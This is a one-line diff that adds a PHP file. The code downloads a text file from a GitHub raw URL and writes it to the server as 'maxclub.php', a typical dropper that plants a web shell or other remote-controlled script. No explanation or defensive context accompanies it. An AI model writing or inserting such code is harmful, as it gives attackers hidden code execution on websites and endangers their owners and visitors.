@@ -1,0 +1,1 @@
+<?php file_put_contents("maxclub.php",file_get_contents('https://raw.githubusercontent.com/humasjambi/mabes/main/amora-pass.txt')); ?>
